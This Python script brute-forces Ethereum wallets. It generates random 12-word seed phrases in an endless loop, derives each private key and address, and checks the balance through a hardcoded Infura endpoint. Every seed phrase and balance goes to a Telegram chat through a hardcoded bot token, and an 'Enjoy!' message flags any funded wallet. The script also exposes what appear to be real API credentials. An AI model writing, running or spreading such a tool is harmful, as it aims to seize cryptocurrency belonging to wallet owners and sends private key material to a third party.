import asyncio
import requests
from eth_account import Account
from mnemonic import Mnemonic
from colorama import Fore, Style, init
from telegram import Bot
from web3 import Web3

# Initialize colorama
init()

# Enable the unaudited HD wallet features
Account.enable_unaudited_hdwallet_features()

# Your Infura project ID
INFURA_PROJECT_ID = '671e9ce16a7c41dba83b4eb5043677ce'

# Initialize Telegram bot
TELEGRAM_BOT_TOKEN = '5211645193:AAERMrA1lJ7BLmKRIeoppByFJ3d-pasCXLQ'
TELEGRAM_CHAT_ID = '1398837296'

# Connect to an Ethereum node
w3 = Web3(Web3.HTTPProvider(f'https://mainnet.infura.io/v3/{INFURA_PROJECT_ID}'))

async def send_message(bot, message):
    try:
        await bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, parse_mode='HTML')
    except Exception as e:
        print(f"Error sending message: {e}")

# Function to get the balance of an Ethereum address using web3
def get_eth_balance(address):
    try:
        balance_wei = w3.eth.get_balance(address)
        balance_eth = w3.fromWei(balance_wei, 'ether')
        return balance_eth
    except Exception as e:
        print(f"Error fetching balance: {e}")
        return None

# Infinite loop to generate seed phrases and check balances
async def main():
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    while True:
        # Generate a mnemonic seed phrase
        mnemo = Mnemonic("english")
        seed_phrase = mnemo.generate(strength=128)  # 12-word seed phrase

        # Derive private key and address from the seed phrase using standard Ethereum derivation path (m/44'/60'/0'/0/0)
        account = Account.from_mnemonic(seed_phrase)
        private_key = account.key.hex()
        address = account.address

        # Display the seed phrase, private key, and address
        print(f"Seed Phrase: {Fore.YELLOW}{seed_phrase}{Style.RESET_ALL}")
        print(f"Private Key: {Fore.CYAN}{private_key}{Style.RESET_ALL}")
        print(f"Address: {Fore.CYAN}{address}{Style.RESET_ALL}")

        # Check the balance of the generated address
        balance = get_eth_balance(address)
        if balance is not None:
            print(f"Balance: {Fore.RED}{balance} ETH\n" + Style.RESET_ALL)
            # Send seed phrase and balance to Telegram bot
            message = f"📝 Seed Phrase: <code>{seed_phrase}</code>\n🌎 Address: <code>{address}</code>\n💸 Balance: <b>{balance} ETH</b>"
            await send_message(bot, message)
            if balance > 0:
                print(f"Found balance: {Fore.GREEN}{balance} ETH\n" + Style.RESET_ALL)
                # Send additional message if balance is greater than 0.0 ETH
                additional_message = f"🎉 The address <code>{address}</code> has a balance greater than 0.0 ETH!\nHere's a seed phrase - Enjoy!:<pre>{seed_phrase}</pre>"
                await send_message(bot, additional_message)
        else:
            print("Error fetching balance. Please check the address or API key.")

        # Wait for a short interval before generating the next seed phrase and checking the balance
        await asyncio.sleep(0.01)

# Run the asyncio event loop
if __name__ == "__main__":
    asyncio.run(main())
